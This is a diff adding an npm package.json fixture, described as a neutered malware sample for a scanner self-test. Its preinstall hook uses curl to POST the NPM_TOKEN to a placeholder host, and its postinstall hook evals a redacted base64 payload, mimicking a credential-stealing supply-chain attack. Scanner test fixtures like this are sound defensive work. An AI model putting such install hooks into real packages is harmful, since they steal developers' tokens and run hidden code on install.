@@ -1,0 +1,9 @@
+{
+  "name": "malicious-npm-fixture",
+  "version": "1.0.0",
+  "description": "Neutered malware sample for scanner self-test. NOT real malware — tokens and domains replaced.",
+  "scripts": {
+    "postinstall": "node -e \"eval(Buffer.from('REDACTED-BASE64-PAYLOAD','base64').toString())\"",
+    "preinstall": "curl -X POST https://example.com/neutered -d $NPM_TOKEN"
+  }
+}
